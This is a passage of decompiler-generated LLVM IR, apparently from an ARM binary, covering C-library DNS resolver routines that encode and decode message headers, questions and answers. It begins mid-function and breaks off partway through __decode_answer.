  uselistorder i32 %v0_19d8c66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_19d54, { 2, 1, 0, 3 }
  uselistorder i32 %v0_19d6023, { 1, 0 }
  uselistorder i32 %v0_19d44, { 1, 2, 0 }
  uselistorder i32 %v1_19d18, { 1, 2, 0 }
  uselistorder i32 %v0_19d2c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19d40, { 1, 2, 0, 3 }
  uselistorder i1 %v7_19ce0, { 1, 0 }
  uselistorder i32 %v0_19d18, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_19cfc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_19d0c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_19cb0, { 2, 1, 0 }
  uselistorder i32 %v1_19c90, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_19c38, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 5, 6, 10, 0, 1, 9, 7, 11, 2, 3, 4, 8 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 1, 13, 14, 15, 7, 26, 24, 20, 25, 8, 2, 3, 4, 5, 6, 9, 10, 11, 12, 16, 17, 18, 19, 23, 21, 22 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19e84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19e6c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19e14, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_19d60, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19d44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19d3c, { 1, 0 }
  uselistorder label %dec_label_pc_19d18, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_19d14, { 1, 0 }
  uselistorder label %dec_label_pc_19ccc, { 1, 0 }
  uselistorder label %dec_label_pc_19ca0, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_19e9c = load i32, i32* @r4, align 4
  store i32 %v3_19e9c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_19eac = icmp sgt i32 %arg3, 11
  br i1 %v7_19eac, label %dec_label_pc_19eb0, label %dec_label_pc_19f78

dec_label_pc_19eb0:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_19eb0 = add i32 %tmp, 1
  %v2_19eb0 = inttoptr i32 %v1_19eb0 to i8*
  %v3_19eb0 = load i8, i8* %v2_19eb0, align 1
  store i8 %v3_19eb0, i8* %tmp18, align 1
  %v2_19eb8 = load i32, i32* %arg1, align 4
  %v1_19ebc = trunc i32 %v2_19eb8 to i8
  %v4_19ebc = add i32 %arg2, 1
  %v5_19ebc = inttoptr i32 %v4_19ebc to i8*
  store i8 %v1_19ebc, i8* %v5_19ebc, align 1
  %v0_19ec0 = load i32, i32* %lr.global-to-local, align 4
  %v1_19ec0 = add i32 %v0_19ec0, 12
  %v2_19ec0 = inttoptr i32 %v1_19ec0 to i32*
  %v3_19ec0 = load i32, i32* %v2_19ec0, align 4
  %v1_19ec4 = add i32 %v0_19ec0, 4
  %v2_19ec4 = inttoptr i32 %v1_19ec4 to i32*
  %v3_19ec4 = load i32, i32* %v2_19ec4, align 4
  %v1_19ec8 = add i32 %v0_19ec0, 16
  %v2_19ec8 = inttoptr i32 %v1_19ec8 to i32*
  %v3_19ec8 = load i32, i32* %v2_19ec8, align 4
  %v1_19ecc = add i32 %tmp, 8
  %v2_19ecc = inttoptr i32 %v1_19ecc to i32*
  %v3_19ecc = load i32, i32* %v2_19ecc, align 4
  %v2_19ed0 = icmp eq i32 %v3_19ec0, 0
  %. = select i1 %v2_19ed0, i32 0, i32 4
  %v2_19edc = icmp eq i32 %v3_19ec4, 0
  %v1_19ee0 = add i32 %v0_19ec0, 20
  %v2_19ee0 = inttoptr i32 %v1_19ee0 to i32*
  %v3_19ee0 = load i32, i32* %v2_19ee0, align 4
  %storemerge12 = select i1 %v2_19edc, i32 0, i32 128
  %v1_19eec = urem i32 %v3_19ecc, 16
  %v2_19ef0 = icmp eq i32 %v3_19ec8, 0
  %.29 = select i1 %v2_19ef0, i32 0, i32 2
  %v4_19efc = mul nuw nsw i32 %v1_19eec, 8
  %v5_19efc = or i32 %v4_19efc, %.
  %v2_19f00 = icmp eq i32 %v3_19ee0, 0
  br i1 %v2_19f00, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_19eb0
  %v2_19f04 = or i32 %v5_19efc, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_19eb0, %bb25
  %v1_19f0c = phi i32 [ %v5_19efc, %dec_label_pc_19eb0 ], [ %v2_19f04, %bb25 ]
  %v2_19f08 = or i32 %.29, %storemerge12
  %v2_19f0c = or i32 %v2_19f08, %v1_19f0c
  %v1_19f10 = trunc i32 %v2_19f0c to i8
  %v2_19f10 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f10 = add i32 %v2_19f10, 2
  %v4_19f10 = inttoptr i32 %v3_19f10 to i8*
  store i8 %v1_19f10, i8* %v4_19f10, align 1
  %v0_19f14 = load i32, i32* %lr.global-to-local, align 4
  %v1_19f14 = add i32 %v0_19f14, 24
  %v1_19f18 = inttoptr i32 %v1_19f14 to i32*
  %v2_19f18 = load i32, i32* %v1_19f18, align 4
  %v3_19f18 = add i32 %v0_19f14, 28
  %v4_19f18 = inttoptr i32 %v3_19f18 to i32*
  %v5_19f18 = load i32, i32* %v4_19f18, align 4
  %v2_19f1c = icmp eq i32 %v2_19f18, 0
  %v1_19f20 = urem i32 %v5_19f18, 16
  %.30 = select i1 %v2_19f1c, i32 0, i32 128
  %v2_19f2c = or i32 %v1_19f20, %.30
  %v1_19f30 = trunc i32 %v2_19f2c to i8
  %v2_19f30 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f30 = add i32 %v2_19f30, 3
  %v4_19f30 = inttoptr i32 %v3_19f30 to i8*
  store i8 %v1_19f30, i8* %v4_19f30, align 1
  %v0_19f34 = load i32, i32* %lr.global-to-local, align 4
  %v1_19f34 = add i32 %v0_19f34, 33
  %v2_19f34 = inttoptr i32 %v1_19f34 to i8*
  %v3_19f34 = load i8, i8* %v2_19f34, align 1
  %v2_19f38 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f38 = add i32 %v2_19f38, 4
  %v4_19f38 = inttoptr i32 %v3_19f38 to i8*
  store i8 %v3_19f34, i8* %v4_19f38, align 1
  %v0_19f3c = load i32, i32* %lr.global-to-local, align 4
  %v1_19f3c = add i32 %v0_19f3c, 32
  %v2_19f3c = inttoptr i32 %v1_19f3c to i32*
  %v3_19f3c = load i32, i32* %v2_19f3c, align 4
  %v1_19f40 = trunc i32 %v3_19f3c to i8
  %v2_19f40 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f40 = add i32 %v2_19f40, 5
  %v4_19f40 = inttoptr i32 %v3_19f40 to i8*
  store i8 %v1_19f40, i8* %v4_19f40, align 1
  %v0_19f44 = load i32, i32* %lr.global-to-local, align 4
  %v1_19f44 = add i32 %v0_19f44, 37
  %v2_19f44 = inttoptr i32 %v1_19f44 to i8*
  %v3_19f44 = load i8, i8* %v2_19f44, align 1
  %v2_19f48 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f48 = add i32 %v2_19f48, 6
  %v4_19f48 = inttoptr i32 %v3_19f48 to i8*
  store i8 %v3_19f44, i8* %v4_19f48, align 1
  %v0_19f4c = load i32, i32* %lr.global-to-local, align 4
  %v1_19f4c = add i32 %v0_19f4c, 36
  %v2_19f4c = inttoptr i32 %v1_19f4c to i32*
  %v3_19f4c = load i32, i32* %v2_19f4c, align 4
  %v1_19f50 = trunc i32 %v3_19f4c to i8
  %v2_19f50 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f50 = add i32 %v2_19f50, 7
  %v4_19f50 = inttoptr i32 %v3_19f50 to i8*
  store i8 %v1_19f50, i8* %v4_19f50, align 1
  %v0_19f54 = load i32, i32* %lr.global-to-local, align 4
  %v1_19f54 = add i32 %v0_19f54, 41
  %v2_19f54 = inttoptr i32 %v1_19f54 to i8*
  %v3_19f54 = load i8, i8* %v2_19f54, align 1
  %v2_19f58 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f58 = add i32 %v2_19f58, 8
  %v4_19f58 = inttoptr i32 %v3_19f58 to i8*
  store i8 %v3_19f54, i8* %v4_19f58, align 1
  %v0_19f5c = load i32, i32* %lr.global-to-local, align 4
  %v1_19f5c = add i32 %v0_19f5c, 40
  %v2_19f5c = inttoptr i32 %v1_19f5c to i32*
  %v3_19f5c = load i32, i32* %v2_19f5c, align 4
  %v1_19f60 = trunc i32 %v3_19f5c to i8
  %v2_19f60 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f60 = add i32 %v2_19f60, 9
  %v4_19f60 = inttoptr i32 %v3_19f60 to i8*
  store i8 %v1_19f60, i8* %v4_19f60, align 1
  %v0_19f64 = load i32, i32* %lr.global-to-local, align 4
  %v1_19f64 = add i32 %v0_19f64, 45
  %v2_19f64 = inttoptr i32 %v1_19f64 to i8*
  %v3_19f64 = load i8, i8* %v2_19f64, align 1
  %v2_19f68 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f68 = add i32 %v2_19f68, 10
  %v4_19f68 = inttoptr i32 %v3_19f68 to i8*
  store i8 %v3_19f64, i8* %v4_19f68, align 1
  %v0_19f6c = load i32, i32* %lr.global-to-local, align 4
  %v1_19f6c = add i32 %v0_19f6c, 44
  %v2_19f6c = inttoptr i32 %v1_19f6c to i32*
  %v3_19f6c = load i32, i32* %v2_19f6c, align 4
  %v1_19f70 = trunc i32 %v3_19f6c to i8
  %v2_19f70 = load i32, i32* %r4.global-to-local, align 4
  %v3_19f70 = add i32 %v2_19f70, 11
  %v4_19f70 = inttoptr i32 %v3_19f70 to i8*
  store i8 %v1_19f70, i8* %v4_19f70, align 1
  %v2_19f7c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19f78

dec_label_pc_19f78:                               ; preds = %entry, %bb26
  %v2_19f7c = phi i32 [ %v3_19e9c, %entry ], [ %v2_19f7c.pre, %bb26 ]
  %v0_19f78 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_19f7c, i32* @r4, align 4
  ret i32 %v0_19f78

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 1, 2, 0 }
  uselistorder i32 37, { 2, 1, 0, 3 }
  uselistorder i32 33, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19f78, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_19f80 = load i8, i8* %arg1, align 1
  %v4_19f80 = zext i8 %v3_19f80 to i32
  %v2_19f84 = add i32 %tmp, 1
  %v3_19f84 = inttoptr i32 %v2_19f84 to i8*
  %v4_19f84 = load i8, i8* %v3_19f84, align 1
  %v5_19f84 = zext i8 %v4_19f84 to i32
  %v4_19f88 = mul nuw nsw i32 %v4_19f80, 256
  %v5_19f88 = or i32 %v5_19f84, %v4_19f88
  %v2_19f8c = inttoptr i32 %arg2 to i32*
  store i32 %v5_19f88, i32* %v2_19f8c, align 4
  %v2_19f90 = add i32 %tmp, 2
  %v3_19f90 = inttoptr i32 %v2_19f90 to i8*
  %v4_19f90 = load i8, i8* %v3_19f90, align 1
  %tmp4 = icmp slt i8 %v4_19f90, 0
  %v3_19f94 = zext i1 %tmp4 to i32
  %v2_19f98 = add i32 %arg2, 4
  %v3_19f98 = inttoptr i32 %v2_19f98 to i32*
  store i32 %v3_19f94, i32* %v3_19f98, align 4
  %v4_19f9c = load i8, i8* %v3_19f90, align 1
  %div = udiv i8 %v4_19f9c, 8
  %tmp5 = urem i8 %div, 16
  %v1_19fa4 = zext i8 %tmp5 to i32
  %v2_19fa8 = add i32 %arg2, 8
  %v3_19fa8 = inttoptr i32 %v2_19fa8 to i32*
  store i32 %v1_19fa4, i32* %v3_19fa8, align 4
  %v4_19fac = load i8, i8* %v3_19f90, align 1
  %div1 = udiv i8 %v4_19fac, 4
  %tmp6 = urem i8 %div1, 2
  %v1_19fb4 = zext i8 %tmp6 to i32
  %v2_19fb8 = add i32 %arg2, 12
  %v3_19fb8 = inttoptr i32 %v2_19fb8 to i32*
  store i32 %v1_19fb4, i32* %v3_19fb8, align 4
  %v4_19fbc = load i8, i8* %v3_19f90, align 1
  %div2 = udiv i8 %v4_19fbc, 2
  %tmp7 = urem i8 %div2, 2
  %v1_19fc4 = zext i8 %tmp7 to i32
  %v2_19fc8 = add i32 %arg2, 16
  %v3_19fc8 = inttoptr i32 %v2_19fc8 to i32*
  store i32 %v1_19fc4, i32* %v3_19fc8, align 4
  %v4_19fcc = load i8, i8* %v3_19f90, align 1
  %tmp8 = urem i8 %v4_19fcc, 2
  %v1_19fd0 = zext i8 %tmp8 to i32
  %v2_19fd4 = add i32 %arg2, 20
  %v3_19fd4 = inttoptr i32 %v2_19fd4 to i32*
  store i32 %v1_19fd0, i32* %v3_19fd4, align 4
  %v2_19fd8 = add i32 %tmp, 3
  %v3_19fd8 = inttoptr i32 %v2_19fd8 to i8*
  %v4_19fd8 = load i8, i8* %v3_19fd8, align 1
  %tmp9 = icmp slt i8 %v4_19fd8, 0
  %v3_19fdc = zext i1 %tmp9 to i32
  %v2_19fe0 = add i32 %arg2, 24
  %v3_19fe0 = inttoptr i32 %v2_19fe0 to i32*
  store i32 %v3_19fdc, i32* %v3_19fe0, align 4
  %v4_19fe4 = load i8, i8* %v3_19fd8, align 1
  %tmp10 = urem i8 %v4_19fe4, 16
  %v1_19fe8 = zext i8 %tmp10 to i32
  %v2_19fec = add i32 %arg2, 28
  %v3_19fec = inttoptr i32 %v2_19fec to i32*
  store i32 %v1_19fe8, i32* %v3_19fec, align 4
  %v2_19ff0 = add i32 %tmp, 4
  %v3_19ff0 = inttoptr i32 %v2_19ff0 to i8*
  %v4_19ff0 = load i8, i8* %v3_19ff0, align 1
  %v5_19ff0 = zext i8 %v4_19ff0 to i32
  %v2_19ff4 = add i32 %tmp, 5
  %v3_19ff4 = inttoptr i32 %v2_19ff4 to i8*
  %v4_19ff4 = load i8, i8* %v3_19ff4, align 1
  %v5_19ff4 = zext i8 %v4_19ff4 to i32
  %v4_19ff8 = mul nuw nsw i32 %v5_19ff0, 256
  %v5_19ff8 = or i32 %v5_19ff4, %v4_19ff8
  %v2_19ffc = add i32 %arg2, 32
  %v3_19ffc = inttoptr i32 %v2_19ffc to i32*
  store i32 %v5_19ff8, i32* %v3_19ffc, align 4
  %v2_1a000 = add i32 %tmp, 6
  %v3_1a000 = inttoptr i32 %v2_1a000 to i8*
  %v4_1a000 = load i8, i8* %v3_1a000, align 1
  %v5_1a000 = zext i8 %v4_1a000 to i32
  %v2_1a004 = add i32 %tmp, 7
  %v3_1a004 = inttoptr i32 %v2_1a004 to i8*
  %v4_1a004 = load i8, i8* %v3_1a004, align 1
  %v5_1a004 = zext i8 %v4_1a004 to i32
  %v4_1a008 = mul nuw nsw i32 %v5_1a000, 256
  %v5_1a008 = or i32 %v5_1a004, %v4_1a008
  %v2_1a00c = add i32 %arg2, 36
  %v3_1a00c = inttoptr i32 %v2_1a00c to i32*
  store i32 %v5_1a008, i32* %v3_1a00c, align 4
  %v2_1a010 = add i32 %tmp, 8
  %v3_1a010 = inttoptr i32 %v2_1a010 to i8*
  %v4_1a010 = load i8, i8* %v3_1a010, align 1
  %v5_1a010 = zext i8 %v4_1a010 to i32
  %v2_1a014 = add i32 %tmp, 9
  %v3_1a014 = inttoptr i32 %v2_1a014 to i8*
  %v4_1a014 = load i8, i8* %v3_1a014, align 1
  %v5_1a014 = zext i8 %v4_1a014 to i32
  %v4_1a018 = mul nuw nsw i32 %v5_1a010, 256
  %v5_1a018 = or i32 %v5_1a014, %v4_1a018
  %v2_1a01c = add i32 %arg2, 40
  %v3_1a01c = inttoptr i32 %v2_1a01c to i32*
  store i32 %v5_1a018, i32* %v3_1a01c, align 4
  %v2_1a020 = add i32 %tmp, 11
  %v3_1a020 = inttoptr i32 %v2_1a020 to i8*
  %v4_1a020 = load i8, i8* %v3_1a020, align 1
  %v5_1a020 = zext i8 %v4_1a020 to i32
  %v2_1a024 = add i32 %tmp, 10
  %v3_1a024 = inttoptr i32 %v2_1a024 to i8*
  %v4_1a024 = load i8, i8* %v3_1a024, align 1
  %v5_1a024 = zext i8 %v4_1a024 to i32
  %v4_1a02c = mul nuw nsw i32 %v5_1a024, 256
  %v5_1a02c = or i32 %v4_1a02c, %v5_1a020
  %v2_1a030 = add i32 %arg2, 44
  %v3_1a030 = inttoptr i32 %v2_1a030 to i32*
  store i32 %v5_1a02c, i32* %v3_1a030, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 22, 23, 6, 9, 10, 11, 12, 4, 5, 13, 14, 15, 16, 17, 0, 18, 19, 7, 20, 21, 8, 3, 2, 1, 24, 25 }
  uselistorder i32 40, { 10, 11, 3, 13, 1, 12, 2, 0, 4, 5, 6, 7, 8, 9, 14 }
  uselistorder i32 28, { 32, 5, 6, 7, 33, 22, 41, 37, 39, 8, 38, 1, 23, 18, 2, 34, 35, 24, 25, 26, 27, 28, 29, 0, 30, 17, 36, 19, 20, 21, 3, 4, 31, 13, 12, 10, 11, 14, 15, 9, 16, 40 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6, 8 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a038 = load i32, i32* @r4, align 4
  store i32 %v3_1a038, i32* %stack_var_-16, align 4
  %v6_1a038 = load i32, i32* @r5, align 4
  %v9_1a038 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1a040 = load i32, i32* %arg1, align 4
  store i32 %v2_1a040, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_1a04c = inttoptr i32 %v2_1a040 to i8*
  %v2_1a04c = call i32 @__encode_dotted(i8* %v1_1a04c)
  store i32 %v2_1a04c, i32* %r0.global-to-local, align 4
  %v1_1a050 = icmp slt i32 %v2_1a04c, 0
  br i1 %v1_1a050, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_1a058 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_1a058, i32* @r4, align 4
  store i32 %v6_1a038, i32* @r5, align 4
  store i32 %v9_1a038, i32* @r6, align 4
  ret i32 %v2_1a04c

bb6:                                              ; preds = %entry
  %v1_1a054 = load i32, i32* @r4, align 4
  %v2_1a054 = sub i32 %v1_1a054, %v2_1a04c
  %v0_1a060 = load i32, i32* @r6, align 4
  %v2_1a060 = add i32 %v0_1a060, %v2_1a04c
  store i32 %v2_1a060, i32* %r2.global-to-local, align 4
  %v7_1a064 = icmp sgt i32 %v2_1a054, 3
  br i1 %v7_1a064, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_1a068 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_1a068, i32* @r4, align 4
  store i32 %v6_1a038, i32* @r5, align 4
  store i32 %v9_1a038, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_1a06c = load i32, i32* @r5, align 4
  %v1_1a06c = add i32 %v0_1a06c, 5
  %v2_1a06c = inttoptr i32 %v1_1a06c to i8*
  %v3_1a06c = load i8, i8* %v2_1a06c, align 1
  %v5_1a070 = inttoptr i32 %v2_1a060 to i8*
  store i8 %v3_1a06c, i8* %v5_1a070, align 1
  %v0_1a074 = load i32, i32* @r5, align 4
  %v1_1a074 = add i32 %v0_1a074, 4
  %v2_1a074 = inttoptr i32 %v1_1a074 to i32*
  %v3_1a074 = load i32, i32* %v2_1a074, align 4
  %v1_1a078 = trunc i32 %v3_1a074 to i8
  %v2_1a078 = load i32, i32* %r2.global-to-local, align 4
  %v3_1a078 = add i32 %v2_1a078, 1
  %v4_1a078 = inttoptr i32 %v3_1a078 to i8*
  store i8 %v1_1a078, i8* %v4_1a078, align 1
  %v0_1a07c = load i32, i32* @r5, align 4
  %v1_1a07c = add i32 %v0_1a07c, 9
  %v2_1a07c = inttoptr i32 %v1_1a07c to i8*
  %v3_1a07c = load i8, i8* %v2_1a07c, align 1
  %v2_1a080 = load i32, i32* %r2.global-to-local, align 4
  %v3_1a080 = add i32 %v2_1a080, 2
  %v4_1a080 = inttoptr i32 %v3_1a080 to i8*
  store i8 %v3_1a07c, i8* %v4_1a080, align 1
  %v0_1a084 = load i32, i32* @r5, align 4
  %v1_1a084 = add i32 %v0_1a084, 8
  %v2_1a084 = inttoptr i32 %v1_1a084 to i32*
  %v3_1a084 = load i32, i32* %v2_1a084, align 4
  %v0_1a088 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a088 = add i32 %v0_1a088, 4
  store i32 %v1_1a088, i32* %r0.global-to-local, align 4
  %v1_1a08c = trunc i32 %v3_1a084 to i8
  %v2_1a08c = load i32, i32* %r2.global-to-local, align 4
  %v3_1a08c = add i32 %v2_1a08c, 3
  %v4_1a08c = inttoptr i32 %v3_1a08c to i8*
  store i8 %v1_1a08c, i8* %v4_1a08c, align 1
  %v2_1a090 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a090, i32* @r4, align 4
  store i32 %v6_1a038, i32* @r5, align 4
  store i32 %v9_1a038, i32* @r6, align 4
  ret i32 %v1_1a088

; uselistorder directives
  uselistorder i32 %v2_1a04c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_1a038, { 1, 0, 2 }
  uselistorder i32 %v6_1a038, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1a098 = call i32 @__length_dotted()
  %v1_1a09c = icmp slt i32 %v0_1a098, 0
  br i1 %v1_1a09c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_1a0a0 = add i32 %v0_1a098, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_1a0a4 = phi i32 [ %v0_1a098, %entry ], [ %v4_1a0a0, %bb ]
  ret i32 %v5_1a0a4

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_1a0a8 = load i32, i32* @r4, align 4
  %v6_1a0a8 = load i32, i32* @r5, align 4
  %v9_1a0a8 = load i32, i32* @r6, align 4
  %v12_1a0a8 = load i32, i32* @r7, align 4
  %v21_1a0a8 = load i32, i32* @sl, align 4
  %v2_1a0ac = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_1a0ac, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_1a0c8 = call i32 @__decode_dotted()
  store i32 %v0_1a0c8, i32* %r0.global-to-local, align 4
  store i32 %v0_1a0c8, i32* @r7, align 4
  %v1_1a0cc = icmp slt i32 %v0_1a0c8, 0
  %v0_1a0d0 = load i32, i32* @r4, align 4
  %v2_1a0d0 = add i32 %v0_1a0d0, %v0_1a0c8
  store i32 %v2_1a0d0, i32* %r8.global-to-local, align 4
  br i1 %v1_1a0cc, label %bb14, label %dec_label_pc_1a0e0

dec_label_pc_1a0e0:                               ; preds = %entry
  %v1_1a0d8 = load i32, i32* @r5, align 4
  %v2_1a0d8 = sub i32 %v1_1a0d8, %v2_1a0d0
  %v1_1a0e0 = add i32 %v2_1a0d8, -10
  store i32 %v1_1a0e0, i32* @r5, align 4
  %v6_1a0e0 = icmp slt i32 %v1_1a0e0, 0
  store i32 %v2_1a0ac, i32* %r0.global-to-local, align 4
  %v0_1a0e8 = load i32, i32* @sl, align 4
  %v2_1a0e8 = add i32 %v0_1a0e8, %v2_1a0d0
  store i32 %v2_1a0e8, i32* @r4, align 4
  br i1 %v6_1a0e0, label %bb, label %dec_label_pc_1a0f4

bb:                                               ; preds = %dec_label_pc_1a0e0
  br label %bb14

dec_label_pc_1a0f4:                               ; preds = %dec_label_pc_1a0e0
  %v1_1a0f4 = bitcast i32* %stack_var_-288 to i8*
  %v2_1a0f4 = call i32 @__GI_strdup(i8* %v1_1a0f4)
  store i32 %v2_1a0f4, i32* %r0.global-to-local, align 4
  %v1_1a0f8 = load i32, i32* @r6, align 4
  %v2_1a0f8 = inttoptr i32 %v1_1a0f8 to i32*
  store i32 %v2_1a0f4, i32* %v2_1a0f8, align 4
  %v0_1a0fc = load i32, i32* @sl, align 4
  %v1_1a0fc = load i32, i32* %r8.global-to-local, align 4
  %v2_1a0fc = add i32 %v1_1a0fc, %v0_1a0fc
  %v3_1a0fc = inttoptr i32 %v2_1a0fc to i8*
  %v4_1a0fc = load i8, i8* %v3_1a0fc, align 1
  %v6_1a0fc = zext i8 %v4_1a0fc to i32
  %v0_1a100 = load i32, i32* @r4, align 4
  %v1_1a100 = add i32 %v0_1a100, 1
  %v2_1a100 = inttoptr i32 %v1_1a100 to i8*
  %v3_1a100 = load i8, i8* %v2_1a100, align 1
  %v4_1a100 = zext i8 %v3_1a100 to i32
  %v4_1a104 = mul nuw nsw i32 %v6_1a0fc, 256
  %v5_1a104 = or i32 %v4_1a100, %v4_1a104
  store i32 %v5_1a104, i32* %r3.global-to-local, align 4
  %v1_1a108 = load i32, i32* @r6, align 4
  %v2_1a108 = add i32 %v1_1a108, 4
  %v3_1a108 = inttoptr i32 %v2_1a108 to i32*
  store i32 %v5_1a104, i32* %v3_1a108, align 4
  %v0_1a10c = load i32, i32* @r4, align 4
  %v1_1a10c = add i32 %v0_1a10c, 2
  store i32 %v1_1a10c, i32* %r1.global-to-local, align 4
  %v2_1a110 = inttoptr i32 %v1_1a10c to i8*
  %v3_1a110 = load i8, i8* %v2_1a110, align 1
  %v4_1a110 = zext i8 %v3_1a110 to i32
  %v1_1a114 = add i32 %v0_1a10c, 3
  %v2_1a114 = inttoptr i32 %v1_1a114 to i8*
  %v3_1a114 = load i8, i8* %v2_1a114, align 1
  %v4_1a114 = zext i8 %v3_1a114 to i32
  %v4_1a118 = mul nuw nsw i32 %v4_1a110, 256
  %v5_1a118 = or i32 %v4_1a114, %v4_1a118
  store i32 %v5_1a118, i32* %r3.global-to-local, align 4
  %v1_1a11c = load i32, i32* @r6, align 4
  %v2_1a11c = add i32 %v1_1a11c, 8
  %v3_1a11c = inttoptr i32 %v2_1a11c to i32*
  store i32 %v5_1a118, i32* %v3_1a11c, align 4
  %v0_1a120 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a120 = add i32 %v0_1a120, 2
  %v1_1a124 = add i32 %v0_1a120, 3
  %v2_1a124 = inttoptr i32 %v1_1a124 to i8*
  %v3_1a124 = load i8, i8* %v2_1a124, align 1
  %v4_1a124 = zext i8 %v3_1a124 to i32
  store i32 %v4_1a124, i32* %r3.global-to-local, align 4
  %v2_1a128 = inttoptr i32 %v1_1a120 to i8*
  %v3_1a128 = load i8, i8* %v2_1a128, align 1
  %v4_1a128 = zext i8 %v3_1a128 to i32
  store i32 %v4_1a128, i32* %r0.global-to-local, align 4
  %v1_1a12c = add i32 %v0_1a120, 5
  %v2_1a12c = inttoptr i32 %v1_1a12c to i8*
  %v3_1a12c = load i8, i8* %v2_1a12c, align 1
  %v4_1a12c = zext i8 %v3_1a12c to i32
